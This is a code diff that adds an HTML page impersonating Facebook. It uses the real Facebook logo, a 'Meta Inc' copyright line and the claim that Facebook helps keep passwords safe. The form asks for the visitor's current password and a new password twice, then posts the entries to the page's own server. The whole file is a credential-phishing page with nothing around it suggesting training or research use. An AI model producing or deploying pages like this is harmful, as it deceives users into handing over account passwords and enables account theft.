@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook Login</title>
+<link rel="stylesheet" href="styles.css">
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        background-color: #f0f2f5;
+    }
+
+    .container {
+        max-width: 400px;
+        margin: 50px auto;
+        padding: 20px;
+        background-color: #fff;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        text-align: center;
+    }
+
+    .logo img {
+        width: 200px;
+        margin-bottom: 20px;
+    }
+
+    .content h2 {
+        font-size: 18px;
+        color: #333;
+        margin-bottom: 20px;
+    }
+
+    form input {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        border: 1px solid #dddfe2;
+        border-radius: 4px;
+        box-sizing: border-box;
+    }
+
+    form button {
+        width: 100%;
+        padding: 10px;
+        background-color: #1877f2;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+
+    .links a {
+        color: #1877f2;
+        text-decoration: none;
+    }
+
+    .create-account {
+        margin-top: 20px;
+        font-size: 14px;
+    }
+
+    .create-account a {
+        color: #1877f2;
+        text-decoration: none;
+        font-weight: bold;
+    }
+
+    /* Header styles */
+    header {
+        
+        color: #fff;
+        padding: 10px 0;
+        text-align: center;
+    }
+
+    /* Footer styles */
+    footer {
+        background-color: #f0f2f5;
+        color: #333;
+        padding: 10px 0;
+        text-align: center;
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
+    }
+
+</style>
+</head>
+<body>
+<header>
+    <div class="logo">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo">
+    </div>
+</header>
+<div class="container">
+    <div class="content">
+        <h2>Facebook helps you keep your<br>Passwords Safe</h2>
+        <form action="/" method="post">
+            <input type="password" name="email" placeholder="Current Password" required>
+            <input type="password" name="password" placeholder="Retype New Password" required>
+            <input type="password" name="repassword" placeholder="New Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="links">
+            <br>
+            <a href="#">Forgotten password?</a>
+        </div>
+        <div class="create-account">
+            <a href="#">Create new account</a>
+        </div>
+    </div>
+</div>
+<footer>
+    <p>&copy; 2024 Meta Inc . All rights reserved.</p>
+</footer>
+</body>
+</html>
